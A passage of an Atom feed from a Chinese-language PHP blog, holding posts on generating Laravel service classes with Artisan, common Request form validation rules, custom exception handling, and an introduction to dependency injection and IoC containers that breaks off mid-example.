class="title">getDefaultNamespace</span><span class="params">($rootNamespace)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $rootNamespace . <span class="string">'\Services'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过实现 <code>GeneratorCommand</code> 抽象类来生成代码，同时需要在 <code>MakeService.php</code> 同级目录下创建一个 <code>stubs/service.stub</code> 文件，并填入相应的模板文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace &#123;&#123; namespace &#125;&#125;;</span><br><span class="line"></span><br><span class="line">class &#123;&#123; class &#125;&#125;</span><br><span class="line">&#123;</span><br><span class="line">    protected $model;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F; $this-&gt;$model &#x3D; $model;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最红使用 <code>php artisan make:service TestService</code> 命令，就可以生成Service 了～</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Laravel 主要提供了三种实现命令行交互的工具：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Artisan：内置一套命令行操作，并可以自定义进行扩展&lt;/li&gt;
&lt;li&gt;Tinker：为应用提供了 REPL 或者交互的 shell&lt;/li&gt;
&lt;li&gt;安装器：通常在项目初始化时用到&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;本章的内容主要以 Artisan 命令为主。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/categories/PHP/Laravel/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/tags/Laravel/"/>
    
  </entry>
  
  <entry>
    <title>Laravel Request 常见表单验证整理</title>
    <link href="https://www.0x2beace.com/laravel-request-common-form-validation-finishing/"/>
    <id>https://www.0x2beace.com/laravel-request-common-form-validation-finishing/</id>
    <published>2021-05-24T13:11:08.000Z</published>
    <updated>2021-05-24T13:32:15.940Z</updated>
    
    <content type="html"><![CDATA[<p>Laravel 的表单验证非常强大，结合单一职责原则，在Request 类中就能满足日常开发绝大多数验证场景。</p><a id="more"></a><p>下面整理了常用的一些表单验证规则，大致可以分为以下几类：</p><ol><li>常规验证</li><li>自定义规则验证</li><li>数据库验证</li></ol><h2 id="常规验证"><a href="#常规验证" class="headerlink" title="常规验证"></a>常规验证</h2><p>所谓的常规验证就是直接使用Laravel 表单验证为我们提供的验证规则。</p><h3 id="boolean"><a href="#boolean" class="headerlink" title="boolean"></a>boolean</h3><p>验证的字段必须可以转换为 Boolean 类型。 可接受的输入为 <code>true</code> ， <code>false</code> ， <code>1</code> ，<code>0</code> ， <code>&quot;1&quot;</code> 和 <code>&quot;0&quot;</code> 。</p><h3 id="alpha"><a href="#alpha" class="headerlink" title="alpha"></a>alpha</h3><p>待验证字段只能由字母组成。</p><h3 id="alpha-num"><a href="#alpha-num" class="headerlink" title="alpha_num"></a>alpha_num</h3><p>待验证字段只能由字母和数字组成。</p><h3 id="array"><a href="#array" class="headerlink" title="array"></a>array</h3><p>待验证字段必须是有效的 PHP 数组。</p><h3 id="url"><a href="#url" class="headerlink" title="url"></a>url</h3><p>验证的字段必须是有效的 URL。</p><h3 id="integer"><a href="#integer" class="headerlink" title="integer"></a>integer</h3><p>验证的字段必须是整数。</p><h3 id="numeric"><a href="#numeric" class="headerlink" title="numeric"></a>numeric</h3><p>验证字段必须为数值。</p><p>注意数值和整数的区别。</p><h3 id="json"><a href="#json" class="headerlink" title="json"></a>json</h3><p>验证的字段必须是有效的 JSON 字符串。</p><h3 id="max-min"><a href="#max-min" class="headerlink" title="max/min"></a>max/min</h3><p>验证字段必须在最小值与最大值之间。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">"value"</span> =&gt; <span class="string">"max:99|min:1"</span>    </span><br><span class="line">];</span><br></pre></td></tr></table></figure><h3 id="in"><a href="#in" class="headerlink" title="in"></a>in</h3><p>验证字段必须包含在给定的值列表中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">"value"</span> =&gt; <span class="string">"in:0,1,2,3"</span>    </span><br><span class="line">];</span><br></pre></td></tr></table></figure><h3 id="digits-between"><a href="#digits-between" class="headerlink" title="digits_between"></a>digits_between</h3><p>验证中的字段必须为 numeric，并且长度必须在给定的 min 和 max 之间。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">"mobile"</span> =&gt; <span class="string">"digits_between:8,11"</span>    </span><br><span class="line">];</span><br></pre></td></tr></table></figure><h3 id="dimensions"><a href="#dimensions" class="headerlink" title="dimensions"></a>dimensions</h3><p>验证的文件必须是图片并且图片比例必须符合规则:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">'avatar'</span> =&gt; <span class="string">'dimensions:min_width=100,min_height=200'</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>对于图片的验证，使用 <code>dimensions</code> 尤其有用。</p><h3 id="image"><a href="#image" class="headerlink" title="image"></a>image</h3><p>验证的文件必须是图片 (jpeg, png, bmp, gif, svg, or webp)。</p><h3 id="required"><a href="#required" class="headerlink" title="required"></a>required</h3><p>验证的字段必须存在于输入数据中，而不是空。如果满足以下条件之一，则字段被视为「空」：</p><ul><li>值为 null。</li><li>值为空字符串。</li><li>值为空数组或空 Countable 对象。</li><li>值为无路径的上传文件。</li></ul><h3 id="filled"><a href="#filled" class="headerlink" title="filled"></a>filled</h3><p>验证的字段在存在时不能为空。</p><h3 id="exclude-if"><a href="#exclude-if" class="headerlink" title="exclude_if"></a>exclude_if</h3><p>可以指定当验证字段的值为 value 时，其他验证规则可以排除。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">"id"</span> =&gt; <span class="string">"required|exclude_if:id,0|integer|exists:admin,id"</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>当 <code>id</code> 为零时，不会验证<code>exists</code> 规则。</p><h2 id="自定义规则验证"><a href="#自定义规则验证" class="headerlink" title="自定义规则验证"></a>自定义规则验证</h2><p>如果某个规则仅仅只使用一次，那么使用闭包来创建自定义规则再适合不过，闭包函数接收属性的方法，属性的值以及在校验失败时的回调函数 <code>$fail</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">"age"</span> =&gt; <span class="function"><span class="keyword">function</span> <span class="params">($attribute, $value, $fail)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> ($value &gt; <span class="number">18</span>) &#123;</span><br><span class="line">              <span class="keyword">return</span> $fail(<span class="string">"年龄不符"</span>);</span><br><span class="line">          &#125; </span><br><span class="line">     &#125;;</span><br><span class="line">];</span><br></pre></td></tr></table></figure><h2 id="数据库验证"><a href="#数据库验证" class="headerlink" title="数据库验证"></a>数据库验证</h2><h3 id="exists"><a href="#exists" class="headerlink" title="exists"></a>exists</h3><p>验证的字段必须存在于给定的数据库表中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">'email'</span> =&gt; <span class="string">'exists:users,email_address'</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><h3 id="unique"><a href="#unique" class="headerlink" title="unique"></a>unique</h3><p>验证字段在给定的数据库表中必须是唯一的。</p><p>语法：<code>unique:table,column,except,idColumn</code>。</p><p>基本用法，指定自定义的列表：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">'email'</span> =&gt; <span class="string">'unique:users,email_address'</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>在做<code>update</code> 操作时，如果提交了 <code>email</code>，那么上面的那个验证仍然会生效，这时可以通过定义  <code>except</code> 当前用户。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">'email'</span> =&gt; <span class="string">'unique:users,email_address,$this-&gt;uid,uid'</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>生成的SQL：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) <span class="keyword">as</span> aggregate from users where email_address = <span class="string">"geeek001@qq.com"</span> <span class="keyword">and</span> uid &lt;&gt; <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>同样可以使用<code>Rule</code> 助手函数来完成数据库验证：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">"email"</span> =&gt; [</span><br><span class="line">          Rule::unique(<span class="string">"users"</span>, <span class="string">"email_address"</span>),</span><br><span class="line">      ],    </span><br><span class="line">];</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://learnku.com/docs/laravel/8.x/validation/9374#6cc7dc" target="_blank" rel="noopener">Laravel 表单验证</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Laravel 的表单验证非常强大，结合单一职责原则，在Request 类中就能满足日常开发绝大多数验证场景。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/categories/PHP/Laravel/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/tags/Laravel/"/>
    
  </entry>
  
  <entry>
    <title>Laravel Exception 基本使用</title>
    <link href="https://www.0x2beace.com/basic-use-of-laravel-cxception/"/>
    <id>https://www.0x2beace.com/basic-use-of-laravel-cxception/</id>
    <published>2021-05-22T12:46:20.000Z</published>
    <updated>2021-05-24T13:12:05.466Z</updated>
    
    <content type="html"><![CDATA[<p>在Laravel 中，所有异常都是由 <code>App\Exceptions\Handler</code> 类处理，同时也会记录在日志信息中。</p><a id="more"></a><p>通常可能会直接使用 <code>throw new \Exception</code> 来抛出一个异常终止流程，但是由于系统可能会有各式各样的异常，业务代码处处抛出 <code>\Exception</code> 和捕获 <code>\Exception</code>，导致如果遇到系统错误，无法及时通知。</p><p>异常可以大致分为两类： 用户异常 和 系统异常。</p><h3 id="用户错误行为触发的异常"><a href="#用户错误行为触发的异常" class="headerlink" title="用户错误行为触发的异常"></a>用户错误行为触发的异常</h3><p>比如访问一个不存在的资源，对于此类异常我们需要把触发异常的原因告知用户。</p><p>可以把这类异常命名为 <code>InvalidRequestException</code>，在Laravel 中，可以通过 <code>make:exception</code> 命令来创建异常：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan make:exception InvalidRequestException</span><br></pre></td></tr></table></figure><p><code>app/Exceptions/InvalidRequestException.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Exceptions</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Exception</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InvalidRequestException</span> <span class="keyword">extends</span> <span class="title">Exception</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(string $message = <span class="string">""</span>, int $code = <span class="number">400</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">parent</span>::__construct($message, $code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($request-&gt;expectsJson()) &#123;</span><br><span class="line">            <span class="keyword">return</span> response()-&gt;json([<span class="string">'msg'</span> =&gt; <span class="keyword">$this</span>-&gt;message], <span class="keyword">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">      </span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">'pages.error'</span>, [<span class="string">'msg'</span> =&gt; <span class="keyword">$this</span>-&gt;message]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里重写了<code>Illuminate\Foundation\Exceptions\Handler</code> 父类的<code>render()</code> 方法，异常被触发时系统会调用 <code>render()</code> 方法来输出，可以在<code>render()</code> 里判断如果是 AJAX 请求则返回 JSON 格式的数据，否则就返回一个错误页面。</p><p>当异常触发时 Laravel 默认会把异常的信息和调用栈打印到日志（<code>storage/logs/laravel.log</code>）里，比如：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210522110729.png" alt=""></p><p>比如用户异常并不是因为系统本身的问题导致的，不会影响系统的运行，如果大量此类日志打印到日志文件里反而会影响我们去分析真正有问题的异常，因此需要屏蔽这个行为。</p><p>在<code>app/Exceptions/Handler.php</code>类中，将需要屏蔽的类加入到<code>dontReport</code> 属性中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> $dontReport = [</span><br><span class="line">      InvalidRequestException::class,</span><br><span class="line">  ];</span><br></pre></td></tr></table></figure><h3 id="系统内部异常"><a href="#系统内部异常" class="headerlink" title="系统内部异常"></a>系统内部异常</h3><p>比如连接数据库失败，或者某SQL 执行异常，对于此类异常需要有限度地告知用户发生了什么，因此，可以传入两条信息，一条是给用户看的，另一条是打印到日志中给开发人员看的。</p><p>新建一个 <code>InternalException</code> 类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan make:exception InternalException</span><br></pre></td></tr></table></figure><p><code>app/Exceptions/InternalException.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Exceptions</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Exception</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InternalException</span> <span class="keyword">extends</span> <span class="title">Exception</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $msgForUser;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(string $message, string $msgForUser = <span class="string">'系统内部错误'</span>, int $code = <span class="number">500</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">parent</span>::__construct($message, $code);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msgForUser = $msgForUser;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($request-&gt;expectsJson()) &#123;</span><br><span class="line">            <span class="keyword">return</span> response()-&gt;json([<span class="string">'msg'</span> =&gt; <span class="keyword">$this</span>-&gt;msgForUser], <span class="keyword">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">'pages.error'</span>, [<span class="string">'msg'</span> =&gt; <span class="keyword">$this</span>-&gt;msgForUser]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在该类中，只需要传入真正的异常，记录到日志中，而最终返回给用户的只有『系统内部错误』这些信息。</p><h3 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h3><p>假设在控制器中，需要调用一个封装好的API 类，在该类中，使用<code>\Exception</code> 抛出异常，那么在控制器中，可以使用我们自定义的<code>InternalException</code> 类进行接管异常。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>\<span class="title">Api</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">Api</span>\<span class="title">UserApiService</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UsersController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">store</span><span class="params">(UserRequest $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">            </span><br><span class="line">            UserApiService::doSomething();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $exception) &#123;   <span class="comment">// 接管 \Exception 异常</span></span><br><span class="line">            <span class="comment">// 抛出自定义异常</span></span><br><span class="line">            <span class="comment">// $exception-&gt;getMessage() 为 UserApiService 抛出的具体异常信息</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InternalException($exception-&gt;getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端触发异常：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="number">500</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"系统内部异常"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://learnku.com/courses/laravel-shop/8.x/exceptions/10097#0c45e2" target="_blank" rel="noopener">Laravel 优雅地处理异常</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在Laravel 中，所有异常都是由 &lt;code&gt;App\Exceptions\Handler&lt;/code&gt; 类处理，同时也会记录在日志信息中。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/categories/PHP/Laravel/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/tags/Laravel/"/>
    
  </entry>
  
  <entry>
    <title>用一个 IoC 容器来理解什么是依赖注入/控制反转</title>
    <link href="https://www.0x2beace.com/understand-dependency-injection-and-inversion-of-control/"/>
    <id>https://www.0x2beace.com/understand-dependency-injection-and-inversion-of-control/</id>
    <published>2021-05-17T13:03:14.000Z</published>
    <updated>2021-05-18T13:49:13.121Z</updated>
    
    <content type="html"><![CDATA[<p>经常会听到『依赖注入』(DependencyInjection)和『控制反转』(Inversion of Control)这两个名词，初学者往往会被其给吓住，误以为是什么特别高深的技术，其实了解了来龙去脉之后，就会发现仅仅只是名字听上去高大上而已。</p><a id="more"></a><h2 id="依赖注入"><a href="#依赖注入" class="headerlink" title="依赖注入"></a>依赖注入</h2><p>依赖和注入其实说的是同一个东西，它们只是一种编程的思想，其主要作用是用于减少程序间的耦合。以及有效分离对象和它所需的外部资源。</p><p>下面先来看一个简单的小例子来体会下什么是『依赖注入』：</p><p><code>car.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">di</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pay</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"199"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>person.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">di</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buy</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $bwm = <span class="keyword">new</span> Car();</span><br><span class="line">        <span class="keyword">return</span> $bwm-&gt;pay();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$boo = <span class="keyword">new</span> \di\Person();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $boo-&gt;buy();  <span class="comment">// 199</span></span><br></pre></td></tr></table></figure><p>在上面这个例子（主要看Person 这个类），需要明确几个概念：</p><ol><li>依赖：谁依赖了谁？</li><li>注入：谁又注入了谁？</li></ol><p>通过观察可以发现：</p><ol><li>Car 类在Person 类中实例化（Person 类『依赖』于Car 类）</li><li>但此时并没有发现谁『注入』谁</li></ol><p>观察<code>buy()</code> 这个方法，假如需求发生变化，需要买的不是一辆车，而是一栋房，那么还得更改 Person 类的源码，由实例化一辆车改为实例化一栋房。更好的做法应该是，把所需的实例，通过函数参数的方式传入进来。</p><p><code>Person.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">di</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buy</span><span class="params">($obj)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $obj-&gt;pay();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>index.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$boo = <span class="keyword">new</span> \di\Person();</span><br><span class="line"></span><br><span class="line">$car = <span class="keyword">new</span> \di\Car();</span><br><span class="line"><span class="keyword">echo</span> $boo-&gt;buy($car);  <span class="comment">// 199</span></span><br></pre></td></tr></table></figure><p>现在可以清晰的看到，<code>Car类</code>通过函数参数的方式『注入』到了<code>Person 类</code>中。</p><p>『依赖注入』有多种，这里只是用一个最简单的例子来解释『依赖注入』的思想以及可以有效地解决什么问题：</p><ol><li>减少程序间的耦合</li><li>分离对象和它所需的外部资源</li></ol><h2 id="控制反转"><a href="#控制反转" class="headerlink" title="控制反转"></a>控制反转</h2><p>那么啥是控制反转呢？</p><p>再次观察最开始的代码，可以发现，Car 类在Person 类中是<strong>被动实例化</strong>，Person 类<strong>正向控制</strong>了Car 类，其实例化顺序是先有了Person 类才有Car 类：<code>Person -&gt; Car</code>。</p><p>改成后面的注入方式之后，则可以发现，Car 类是<strong>主动实例化</strong>，Person 类失去了对Car 类的控制权，其实例化顺序是先有Car 类才有Person 类：<code>Car -&gt; Person</code>。</p><p>这就是『控制反转』。</p><p>其实很多时候，我们在不经意间都有使用到这种思想，只是自己没有意识到。</p><h2 id="IoC-容器"><a href="#IoC-容器" class="headerlink" title="IoC 容器"></a>IoC 容器</h2><p>Ioc容器（Inversion of Control）常常伴随着依赖注入、控制反转一起出现，那么它倒底是个什么东西呢？</p><p>在回答这个问题之前，先来看看上面的那段代码，虽然最后使用依赖注入的方式解耦了<code>Person类</code> 和<code>Car 类</code>，但此时又会面临一个新的问题：依赖仍然需要手动创建，此时只有两个类相互依赖还好，一旦类的依赖关系，嵌套过深，手动创建就会变成一件麻烦事：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$boo = <span class="keyword">new</span> \di\Person();</span><br><span class="line"><span class="keyword">echo</span> $boo-&gt;buy(<span class="keyword">new</span> 